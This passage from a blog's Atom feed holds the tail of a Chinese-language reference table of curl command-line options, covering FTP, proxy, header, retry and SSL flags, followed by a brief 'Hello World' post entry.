如果远程目录不存在，创建远程目录</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">28</span></pre></td><td class="code"><pre><span class="line">--ftp-method [multicwd&#x2F;nocwd&#x2F;singlecwd]    控制CWD的使用</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">29</span></pre></td><td class="code"><pre><span class="line">--ftp-pasv                      使用 PASV&#x2F;EPSV 代替端口</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">30</span></pre></td><td class="code"><pre><span class="line">--ftp-skip-pasv-ip              使用PASV的时候,忽略该IP地址</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">31</span></pre></td><td class="code"><pre><span class="line">--ftp-ssl                      尝试用 SSL&#x2F;TLS 来进行ftp数据传输</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">32</span></pre></td><td class="code"><pre><span class="line">--ftp-ssl-reqd                  要求用 SSL&#x2F;TLS 来进行ftp数据传输</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">33</span></pre></td><td class="code"><pre><span class="line">*-F&#x2F;--form &lt;name&#x3D;content&gt;        模拟http表单提交数据</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">34</span></pre></td><td class="code"><pre><span class="line">-form-string &lt;name&#x3D;string&gt;      模拟http表单提交数据</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">35</span></pre></td><td class="code"><pre><span class="line">-g&#x2F;--globoff                    禁用网址序列和范围使用&#123;&#125;和[]</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">36</span></pre></td><td class="code"><pre><span class="line">* -G&#x2F;--get                        以get的方式来发送数据</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">37</span></pre></td><td class="code"><pre><span class="line">-h&#x2F;--help                      帮助</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">38</span></pre></td><td class="code"><pre><span class="line">*-H&#x2F;--header &lt;line&gt;              自定义头信息传递给服务器</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">39</span></pre></td><td class="code"><pre><span class="line">--ignore-content-length        忽略的HTTP头信息的长度</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">40</span></pre></td><td class="code"><pre><span class="line">-i&#x2F;--include                    输出时包括protocol头信息</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">41</span></pre></td><td class="code"><pre><span class="line">*-I&#x2F;--head                      只显示文档信息</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">42</span></pre></td><td class="code"><pre><span class="line">-j&#x2F;--junk-session-cookies      读取文件时忽略session cookie</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">43</span></pre></td><td class="code"><pre><span class="line">--interface &lt;interface&gt;        使用指定网络接口&#x2F;地址</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">44</span></pre></td><td class="code"><pre><span class="line">--krb4 &lt;level&gt;                  使用指定安全级别的krb4</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">45</span></pre></td><td class="code"><pre><span class="line">-k&#x2F;--insecure                  允许不使用证书到SSL站点</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">46</span></pre></td><td class="code"><pre><span class="line">-K&#x2F;--config                    指定的配置文件读取</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">47</span></pre></td><td class="code"><pre><span class="line">-l&#x2F;--list-only                  列出ftp目录下的文件名称</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">48</span></pre></td><td class="code"><pre><span class="line">--limit-rate &lt;rate&gt;            设置传输速度</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">49</span></pre></td><td class="code"><pre><span class="line">--local-port&lt;NUM&gt;              强制使用本地端口号</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">50</span></pre></td><td class="code"><pre><span class="line">-m&#x2F;--max-time &lt;seconds&gt;        设置最大传输时间</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">51</span></pre></td><td class="code"><pre><span class="line">--max-redirs &lt;num&gt;              设置最大读取的目录数</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">52</span></pre></td><td class="code"><pre><span class="line">--max-filesize &lt;bytes&gt;          设置最大下载的文件总量</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">53</span></pre></td><td class="code"><pre><span class="line">-M&#x2F;--manual                    显示全手动</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">54</span></pre></td><td class="code"><pre><span class="line">-n&#x2F;--netrc                      从netrc文件中读取用户名和密码</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">55</span></pre></td><td class="code"><pre><span class="line">--netrc-optional                使用 .netrc 或者 URL来覆盖-n</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">56</span></pre></td><td class="code"><pre><span class="line">--ntlm                          使用 HTTP NTLM 身份验证</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">57</span></pre></td><td class="code"><pre><span class="line">-N&#x2F;--no-buffer                  禁用缓冲输出</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">58</span></pre></td><td class="code"><pre><span class="line">-p&#x2F;--proxytunnel                使用HTTP代理</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">59</span></pre></td><td class="code"><pre><span class="line">--proxy-anyauth                选择任一代理身份验证方法</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">60</span></pre></td><td class="code"><pre><span class="line">--proxy-basic                  在代理上使用基本身份验证</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">61</span></pre></td><td class="code"><pre><span class="line">--proxy-digest                  在代理上使用数字身份验证</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">62</span></pre></td><td class="code"><pre><span class="line">--proxy-ntlm                    在代理上使用ntlm身份验证</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">63</span></pre></td><td class="code"><pre><span class="line">-P&#x2F;--ftp-port &lt;address&gt;        使用端口地址，而不是使用PASV</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">64</span></pre></td><td class="code"><pre><span class="line">-Q&#x2F;--quote &lt;cmd&gt;                文件传输前，发送命令到服务器</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">65</span></pre></td><td class="code"><pre><span class="line">--range-file                    读取（SSL）的随机文件</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">66</span></pre></td><td class="code"><pre><span class="line">-R&#x2F;--remote-time                在本地生成文件时，保留远程文件时间</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">67</span></pre></td><td class="code"><pre><span class="line">--retry &lt;num&gt;                  传输出现问题时，重试的次数</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">68</span></pre></td><td class="code"><pre><span class="line">--retry-delay &lt;seconds&gt;        传输出现问题时，设置重试间隔时间</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">69</span></pre></td><td class="code"><pre><span class="line">--retry-max-time &lt;seconds&gt;      传输出现问题时，设置最大重试时间</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">70</span></pre></td><td class="code"><pre><span class="line">-S&#x2F;--show-error                显示错误</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">71</span></pre></td><td class="code"><pre><span class="line">--socks4 &lt;host[:port]&gt;          用socks4代理给定主机和端口</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">72</span></pre></td><td class="code"><pre><span class="line">--socks5 &lt;host[:port]&gt;          用socks5代理给定主机和端口</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">73</span></pre></td><td class="code"><pre><span class="line">-t&#x2F;--telnet-option &lt;OPT&#x3D;val&gt;    Telnet选项设置</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">74</span></pre></td><td class="code"><pre><span class="line">--trace &lt;file&gt;                  对指定文件进行debug</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">75</span></pre></td><td class="code"><pre><span class="line">--trace-ascii &lt;file&gt;            Like --跟踪但没有hex输出</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">76</span></pre></td><td class="code"><pre><span class="line">--trace-time                    跟踪&#x2F;详细输出时，添加时间戳</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">77</span></pre></td><td class="code"><pre><span class="line">--url &lt;URL&gt;                    Spet URL to work with</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">78</span></pre></td><td class="code"><pre><span class="line">-U&#x2F;--proxy-user &lt;user[:password]&gt;  设置代理用户名和密码</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">79</span></pre></td><td class="code"><pre><span class="line">-V&#x2F;--version                    显示版本信息</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">80</span></pre></td><td class="code"><pre><span class="line">-X&#x2F;--request &lt;command&gt;          指定什么命令</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">81</span></pre></td><td class="code"><pre><span class="line">-y&#x2F;--speed-time                放弃限速所要的时间。默认为30</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">82</span></pre></td><td class="code"><pre><span class="line">-Y&#x2F;--speed-limit                停止传输速度的限制，速度时间&#39;秒</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">83</span></pre></td><td class="code"><pre><span class="line">-z&#x2F;--time-cond                  传送时间设置</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">84</span></pre></td><td class="code"><pre><span class="line">-0&#x2F;--http1.0                    使用HTTP 1.0</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">85</span></pre></td><td class="code"><pre><span class="line">-1&#x2F;--tlsv1                      使用TLSv1（SSL）</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">86</span></pre></td><td class="code"><pre><span class="line">-2&#x2F;--sslv2                      使用SSLv2的（SSL）</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">87</span></pre></td><td class="code"><pre><span class="line">-3&#x2F;--sslv3                      使用的SSLv3（SSL）</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">88</span></pre></td><td class="code"><pre><span class="line">--3p-quote                      like -Q for the source URL for 3rd party transfer</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">89</span></pre></td><td class="code"><pre><span class="line">--3p-url                        使用url，进行第三方传送</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">90</span></pre></td><td class="code"><pre><span class="line">--3p-user                      使用用户名和密码，进行第三方传送</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">91</span></pre></td><td class="code"><pre><span class="line">-4&#x2F;--ipv4                      使用IP4</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">92</span></pre></td><td class="code"><pre><span class="line">-6&#x2F;--ipv6                      使用IP6</span></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      在Linux中curl是一个利用URL规则在命令行下工作的文件传输工具，可以说是一款很强大的http命令行工具。它支持文件的上传和下载，是综合传输工具，但按传统，习惯称url为下载工具。
    
    </summary>
    
    
      <category term="tools" scheme="http://h3art3ars.github.io/categories/tools/"/>
    
    
      <category term="linux" scheme="http://h3art3ars.github.io/tags/linux/"/>
    
      <category term="command" scheme="http://h3art3ars.github.io/tags/command/"/>
    
  </entry>
  
  <entry>
    <title>Hello World</title>
    <link href="http://h3art3ars.github.io/2019/12/09/hello-world/"/>
    <id>http://h3art3ars.github.io/2019/12/09/hello-world/</id>
    <published>2019-12-09T14:44:38.260Z</published>
    <updated>2019-12-11T07:37:10.883Z</updated>
    
    <content type="html"><![CDATA[<h1 id="纪念新博客"><a href="#纪念新博客" class="headerlink" title="纪念新博客"></a>纪念新博客</h1><p><code>至此</code></p>]]></content>
    
    <summary type="html">
    
      the first page
    
    </summary>
    
    
    
  </entry>
  
</feed>
